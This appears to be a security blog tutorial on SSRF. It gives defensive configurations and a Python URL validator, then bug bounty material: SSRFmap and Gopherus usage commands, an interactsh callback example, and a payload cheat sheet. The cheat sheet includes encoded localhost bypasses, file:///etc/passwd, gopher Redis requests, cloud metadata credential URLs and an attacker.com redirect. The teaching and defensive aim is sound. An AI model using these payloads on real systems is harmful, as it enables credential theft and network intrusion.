    image: my-internal-api
    networks:
      - backend
    # Not accessible from frontend network

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # No external access
```

---

### 5. Enforce IMDSv2 on AWS

IMDSv2 requires a token obtained via a PUT request, which most SSRF vulnerabilities cannot perform.

```bash
# Enforce IMDSv2 on an existing instance
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled \
    --http-put-response-hop-limit 1

# Enforce IMDSv2 at launch
aws ec2 run-instances \
    --image-id ami-0abcdef1234567890 \
    --instance-type t3.micro \
    --metadata-options "HttpTokens=required,HttpEndpoint=enabled,HttpPutResponseHopLimit=1"
```

**How IMDSv2 works:**

```bash
# Step 1: Get a token (requires PUT — SSRF usually can't do this)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token to access metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/"
```

**Terraform — Enforce IMDSv2:**

```hcl
resource "aws_instance" "secure_instance" {
  ami           = "ami-0abcdef1234567890"
  instance_type = "t3.micro"

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # Enforce IMDSv2
    http_put_response_hop_limit = 1
    instance_metadata_tags      = "enabled"
  }

  tags = {
    Name = "Secure-Instance"
  }
}
```

---

### 6. Use a Dedicated Egress Proxy

Route all outbound HTTP requests through a proxy that enforces security policies:

```python
import requests

PROXY_CONFIG = {
    'http': 'http://egress-proxy.internal:8080',
    'https': 'http://egress-proxy.internal:8080'
}

def safe_fetch_via_proxy(url):
    """
    All outbound requests go through a security proxy that:
    - Blocks internal IP ranges
    - Logs all requests
    - Enforces domain allowlists
    - Strips sensitive headers
    """
    response = requests.get(
        url,
        proxies=PROXY_CONFIG,
        timeout=10,
        allow_redirects=False
    )
    return response
```

**Squid proxy configuration for egress filtering:**

```text
# /etc/squid/squid.conf

# Block internal networks
acl internal_nets dst 10.0.0.0/8
acl internal_nets dst 172.16.0.0/12
acl internal_nets dst 192.168.0.0/16
acl internal_nets dst 127.0.0.0/8
acl internal_nets dst 169.254.0.0/16
acl internal_nets dst ::1/128
acl internal_nets dst fc00::/7

http_access deny internal_nets

# Allow only specific domains (optional - strict mode)
# acl allowed_domains dstdomain .trusted-api.com .cdn.example.com
# http_access allow allowed_domains
# http_access deny all

# Allow all external
http_access allow all

http_port 8080
```

---

### 7. Secure Code Example — Complete Implementation

```python
#!/usr/bin/env python3
"""
Secure URL Fetcher - Protected against SSRF attacks.
"""

import ipaddress
import socket
import re
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# ============================================================
# Configuration
# ============================================================

ALLOWED_SCHEMES = ['http', 'https']

ALLOWED_DOMAINS = [
    'api.trusted-service.com',
    'cdn.example.com',
    'images.partner-site.com',
]

BLOCKED_NETWORKS = [
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('100.64.0.0/10'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.0.0.0/24'),
    ipaddress.ip_network('192.0.2.0/24'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('198.18.0.0/15'),
    ipaddress.ip_network('224.0.0.0/4'),
    ipaddress.ip_network('240.0.0.0/4'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
    ipaddress.ip_network('fe80::/10'),
]

MAX_RESPONSE_SIZE = 10 * 1024 * 1024  # 10 MB
REQUEST_TIMEOUT = 10  # seconds

# ============================================================
# Validation Functions
# ============================================================

def validate_url(url):
    """Comprehensive URL validation to prevent SSRF."""
    errors = []

    # Parse URL
    try:
        parsed = urlparse(url)
    except Exception:
        raise ValueError("Invalid URL format")

    # 1. Validate scheme
    if parsed.scheme.lower() not in ALLOWED_SCHEMES:
        errors.append(f"Blocked scheme: '{parsed.scheme}'")

    # 2. Validate hostname exists
    if not parsed.hostname:
        errors.append("No hostname found in URL")

    if errors:
        raise ValueError("; ".join(errors))

    hostname = parsed.hostname

    # 3. Block URLs with embedded credentials
    if parsed.username or parsed.password:
        raise ValueError("URLs with embedded credentials are blocked")

    # 4. Block suspicious hostname patterns
    suspicious_patterns = [
        r'^\d+$',                    # Pure numeric (decimal IP)
        r'^0x[0-9a-fA-F]+$',        # Hex IP
        r'^0[0-7]+$',               # Octal IP
        r'.*@.*',                     # @ symbol bypass
        r'.*%.*',                     # URL-encoded characters in hostname
    ]
    for pattern in suspicious_patterns:
        if re.match(pattern, hostname):
            raise ValueError(f"Suspicious hostname pattern detected: '{hostname}'")

    # 5. Allowlist check (if configured)
    if ALLOWED_DOMAINS:
        if hostname not in ALLOWED_DOMAINS:
            raise ValueError(f"Domain '{hostname}' is not in the allowlist")

    # 6. Resolve and validate IP
    try:
        resolved_ip_str = socket.gethostbyname(hostname)
        resolved_ip = ipaddress.ip_address(resolved_ip_str)
    except socket.gaierror:
        raise ValueError(f"Cannot resolve hostname: '{hostname}'")
    except ValueError:
        raise ValueError(f"Invalid IP address resolved: '{hostname}'")

    # 7. Check against blocked networks
    for network in BLOCKED_NETWORKS:
        if resolved_ip in network:
            raise ValueError(
                f"Blocked: '{hostname}' resolves to internal IP {resolved_ip_str} "
                f"(in range {network})"
            )

    # 8. Block non-standard ports
    allowed_ports = [None, 80, 443]
    if parsed.port not in allowed_ports:
        raise ValueError(f"Port {parsed.port} is not allowed")

    return True

# ============================================================
# Routes
# ============================================================

@app.route('/api/fetch')
def secure_fetch():
    """Securely fetch a URL with full SSRF protection."""
    url = request.args.get('url')

    if not url:
        return jsonify({"error": "URL parameter is required"}), 400

    # Validate URL
    try:
        validate_url(url)
    except ValueError as e:
        app.logger.warning(f"SSRF attempt blocked: {url} — {str(e)}")
        return jsonify({"error": f"URL blocked: {str(e)}"}), 403

    # Fetch with safety controls
    try:
        response = requests.get(
            url,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=False,  # Don't follow redirects!
            stream=True,
            headers={
                'User-Agent': 'SafeFetcher/1.0'
            }
        )

        # Check response size before reading
        content_length = response.headers.get('Content-Length')
        if content_length and int(content_length) > MAX_RESPONSE_SIZE:
            return jsonify({"error": "Response too large"}), 413

        # Read limited content
        content = response.content[:MAX_RESPONSE_SIZE]

        return jsonify({
            "status_code": response.status_code,
            "content_length": len(content),
            "content": content.decode('utf-8', errors='replace')
        })

    except requests.exceptions.Timeout:
        return jsonify({"error": "Request timed out"}), 504
    except requests.exceptions.RequestException as e:
        return jsonify({"error": "Failed to fetch URL"}), 500

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

---

### Defense-in-Depth Checklist

- [x] Implement allowlist-based URL validation
- [x] Resolve hostnames and validate against blocked IP ranges
- [x] Disable unnecessary protocols (`file://`, `gopher://`, `dict://`)
- [x] Use network segmentation and firewall rules
- [x] Block metadata endpoints at the network level (iptables)
- [x] Enforce IMDSv2 on cloud instances
- [x] Disable HTTP redirect following (`allow_redirects=False`)
- [x] Sanitize and validate redirect targets if following is required
- [x] Implement proper error handling (don't leak internal info)
- [x] Use a dedicated proxy/egress gateway for outbound requests
- [x] Set response size limits to prevent denial of service
- [x] Log and monitor all outbound requests from the application
- [x] Implement rate limiting on URL-fetching endpoints
- [x] Use DNS pinning to prevent TOCTOU / DNS rebinding attacks
- [x] Run the application with minimal network permissions

---

## SSRF Testing Tools

| Tool | Description | Link |
|------|-------------|------|
| **Burp Suite** | Intercept and modify requests, use Collaborator for blind SSRF | [portswigger.net](https://portswigger.net/burp) |
| **SSRFmap** | Automatic SSRF fuzzer and exploitation tool | [GitHub](https://github.com/swisskyrepo/SSRFmap) |
| **Gopherus** | Generate gopher payloads for exploiting SSRF with Redis, MySQL, etc. | [GitHub](https://github.com/tarunkant/Gopherus) |
| **Interactsh** | OOB interaction server for blind SSRF detection | [GitHub](https://github.com/projectdiscovery/interactsh) |
| **ffuf** | Fast web fuzzer useful for SSRF endpoint discovery | [GitHub](https://github.com/ffuf/ffuf) |
| **SSRFire** | Automated SSRF finder | [GitHub](https://github.com/ksharinarayanan/SSRFire) |
| **Ground Control** | A collection of scripts for blind SSRF | [GitHub](https://github.com/jobertabma/ground-control) |
| **SSRF Sheriff** | SSRF detection tool by Bug Bounty hunters | [GitHub](https://github.com/teknogeek/ssrf-sheriff) |

### Tool Usage Examples

**SSRFmap:**

```bash
# Clone and install
git clone https://github.com/swisskyrepo/SSRFmap.git
cd SSRFmap
pip3 install -r requirements.txt

# Basic usage
python3 ssrfmap.py -r request.txt -p url -m readfiles

# With specific module
python3 ssrfmap.py -r request.txt -p url -m portscan

# Request file format (request.txt):
# GET /api/fetch?url=SSRF HTTP/1.1
# Host: vulnerable-app.com
```

**Gopherus:**

```bash
# Clone and install
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus

# Generate Redis payload
python3 gopherus.py --exploit redis

# Generate MySQL payload
python3 gopherus.py --exploit mysql

# Generate FastCGI payload
python3 gopherus.py --exploit fastcgi

# Generate SMTP payload
python3 gopherus.py --exploit smtp
```

**Interactsh:**

```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run client
interactsh-client

# Output: [INF] Listing 1 payload for OOB Testing
# [INF] abc123def456.interact.sh

# Use in SSRF payload
curl "https://vulnerable-app.com/fetch?url=http://abc123def456.interact.sh"

# Check for callbacks in the interactsh terminal
```

---

## SSRF in Bug Bounty — Tips & Tricks

### Where to Look

1. **URL Preview / Unfurling** — Slack, Discord-like link previews
2. **Webhook URLs** — Notification callbacks, CI/CD integrations
3. **File Import from URL** — "Import CSV from URL", "Fetch RSS feed"
4. **PDF/HTML Generators** — wkhtmltopdf, Puppeteer, PhantomJS
5. **Image Proxy / Resizer** — Avatar upload from URL, image optimization
6. **OAuth/SSO Flows** — `redirect_uri`, `callback_url` parameters
7. **API Documentation** — Swagger/OpenAPI with URL parameters
8. **Email Features** — "Send test email" with custom SMTP server
9. **SVG/XML Upload** — XXE to SSRF chain
10. **GraphQL Queries** — Look for URL-type fields

### Bug Bounty Payloads Cheat Sheet

```text
# Basic payloads
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/

# Encoded payloads
http://%31%32%37%2e%30%2e%30%2e%31
http://2130706433
http://0x7f000001
http://0177.0.0.01
http://[::1]
http://[::ffff:127.0.0.1]
http://127.0.0.1.nip.io

# Protocol-based payloads
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/info

# Redirect-based payloads
http://attacker.com/redirect?url=http://169.254.169.254/

# DNS rebinding
http://rbndr.us/your-payload

# Cloud-specific payloads
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Writing a Good SSRF Bug Bounty Report

```text
## Title
SSRF in [Feature Name] allows access to AWS metadata and credential theft

## Summary
The [feature] at `POST /api/webhook` is vulnerable to Server-Side Request
Forgery. By providing an internal URL as the `callback_url` parameter, an
attacker can make the server send requests to internal services, including
the AWS Instance Metadata Service at 169.254.169.254.

## Steps to Reproduce
1. Log in to the application
2. Navigate to Settings > Webhooks
3. Set the webhook URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. Click "Test Webhook"
5. Observe the response containing the IAM role name

## Impact
- Access to AWS IAM temporary credentials
- Potential full AWS account compromise
- Access to internal services and databases
- Internal network reconnaissance

## CVSS Score
8.6 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N

## Remediation
1. Validate and sanitize all user-supplied URLs
2. Implement allowlist-based domain validation
3. Block requests to internal IP ranges (RFC 1918)
4. Enforce IMDSv2 on AWS instances
5. Use network-level controls to block metadata access
```

> A basic SSRF might be rated as **Medium** (~$500-$2,000), but SSRF that leads to **credential theft** or **RCE** can be rated as **Critical** with bounties exceeding **$10,000-$50,000+**.
{: .prompt-tip }

---

## Notable SSRF CVEs

| CVE | Application | Impact | CVSS |
|-----|-------------|--------|------|
| CVE-2019-5464 | GitLab | SSRF via Project Import feature | 9.8 |
| CVE-2021-21975 | VMware vRealize Operations | Pre-auth SSRF to information disclosure | 7.5 |
| CVE-2021-26855 | Microsoft Exchange (ProxyLogon) | SSRF chain leading to RCE | 9.8 |
| CVE-2020-8135 | Fastify | SSRF via URL parsing inconsistency | 7.5 |
| CVE-2023-42793 | JetBrains TeamCity | SSRF leading to authentication bypass and RCE | 9.8 |
| CVE-2021-44228 | Log4j (Log4Shell) | SSRF + RCE via JNDI lookup | 10.0 |
| CVE-2022-22947 | Spring Cloud Gateway | SSRF via SpEL code injection | 10.0 |
| CVE-2019-17558 | Apache Solr | SSRF via Velocity template injection | 9.8 |
| CVE-2020-36289 | Atlassian Jira | SSRF in Jira Server and Data Center | 5.3 |
| CVE-2023-23397 | Microsoft Outlook | NTLM relay via SSRF in calendar invites | 9.8 |

---

## SSRF Attack Decision Tree

```mermaid
graph TD
    A[Found URL Parameter?] -->|Yes| B{Can you control the full URL?}
    A -->|No| Z[Look for hidden parameters]

    B -->|Yes| C{Response reflected?}
    B -->|Partial| D[Try parameter pollution / injection]

    C -->|Yes| E[In-Band SSRF!]
    C -->|No| F{Can detect OOB interaction?}

    E --> G[Try cloud metadata endpoints]
    E --> H[Try internal port scanning]
    E --> I[Try file:// protocol]

    F -->|Yes| J[Blind SSRF confirmed!]
    F -->|No| K[Try time-based detection]

    G --> L{Got credentials?}
    L -->|Yes| M[Critical - Full compromise!]
    L -->|No| N[Try other internal services]

    J --> O[Try DNS rebinding for upgrade]
    J --> P[Report as Blind SSRF]

    style A fill:#3498db,stroke:#2980b9,color:#fff
    style E fill:#e74c3c,stroke:#c0392b,color:#fff
    style J fill:#e67e22,stroke:#d35400,color:#fff
    style M fill:#c0392b,stroke:#962d22,color:#fff
    style P fill:#f39c12,stroke:#e67e22,color:#fff
```

---

## Labs & Practice Resources

### Free Labs

1. **[PortSwigger Web Security Academy — SSRF Labs](https://portswigger.net/web-security/ssrf)**
   - Basic SSRF against the local server
   - SSRF against other back-end systems
   - SSRF with blacklist-based input filter bypass
   - SSRF with whitelist-based input filter bypass
   - SSRF with filter bypass via open redirection
   - Blind SSRF with out-of-band detection
   - Blind SSRF with Shellshock exploitation

2. **[TryHackMe — SSRF Room](https://tryhackme.com/room/ssrf)** — Guided walkthrough with challenges

3. **[OWASP WebGoat](https://owasp.org/www-project-webgoat/)** — SSRF exercises included

4. **[PentesterLab — SSRF Exercises](https://pentesterlab.com/)** — Multiple SSRF challenges

### Paid / CTF Platforms

5. **[HackTheBox](https://www.hackthebox.com/)** — Multiple machines featuring SSRF
6. **[BugBountyHunter.com](https://www.bugbountyhunter.com/)** — Realistic SSRF labs
7. **[Root-Me](https://www.root-me.org/)** — SSRF challenges in web category

---

## Conclusion

SSRF remains one of the most impactful vulnerabilities in modern web applications, especially in **cloud-native environments** where metadata services expose sensitive credentials. A single SSRF vulnerability can lead to:

- 🔑 **Complete cloud account takeover** via stolen IAM credentials
- 🖥️ **Remote Code Execution** via SSRF-to-RCE chains (gopher + Redis/FastCGI)
- 🔍 **Internal network reconnaissance** and lateral movement
- 📦 **Data exfiltration** from internal databases and APIs
- 💰 **Critical severity bug bounty rewards** ($10,000 - $50,000+)

### Key Takeaways

| For Developers | For Pentesters |
|---------------|---------------|
| Always validate and sanitize user-supplied URLs | Look for any feature that accepts URLs |
| Use allowlists, **never** blocklists alone | Test all bypass techniques systematically |
| Block internal IP ranges at both code and network level | Chain SSRF with other vulns for maximum impact |
| Enforce IMDSv2 in AWS environments | Use OOB tools for blind SSRF detection |
| Disable `file://`, `gopher://`, `dict://` protocols | Always try to escalate to credential theft or RCE |
| Don't follow HTTP redirects by default | Document impact clearly in reports |
| Use egress proxies for outbound requests | Practice on PortSwigger and TryHackMe labs |

---

## References

- [OWASP — Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [AWS — Instance Metadata Service v2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Bug Bounty Bootcamp — SSRF Chapter](https://nostarch.com/bug-bounty-bootcamp)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [SSRF Bible Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

*Last updated: January 15, 2024*
*Author: Security Researcher*
*License: MIT*
